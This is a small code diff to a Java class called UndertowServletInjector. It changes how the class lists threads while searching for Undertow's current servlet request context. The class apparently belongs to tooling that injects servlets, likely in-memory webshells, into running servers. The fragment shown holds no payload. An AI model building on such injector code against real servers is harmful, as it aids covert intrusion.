@@ -8,6 +8,7 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -45,7 +46,7 @@ public class UndertowServletInjector {
 
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             try {
                 Object requestContext = invokeMethod(thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current", null, null);
